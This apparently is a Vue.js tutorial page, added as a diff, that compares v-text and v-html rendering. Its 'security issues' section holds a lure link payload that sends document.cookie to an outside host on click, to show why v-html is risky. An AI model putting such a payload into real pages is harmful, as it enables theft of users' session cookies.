@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello Vue</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+
+<body>
+    <div id="root">
+        <h1>{{title}}</h1>
+        <hr> <br>
+        使用v-text
+        <br>
+        <div v-text="str"></div>
+        <hr> <br>
+        使用v-html
+        <br>
+        <div v-html="str"></div>
+        <hr> <br>
+        安全相关问题
+        <br>
+        <div v-html="str2"></div>
+    </div>
+</body>
+<script type="text/javascript">
+    Vue.config.productionTip = false
+    new Vue({
+        el: '#root',
+        data: {
+            title: 'Hello Vue',
+            str: '<h2> 我是h2 </h2>',
+            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击领取红包</a>'
+        }
+    })
+</script>
+
+</html>
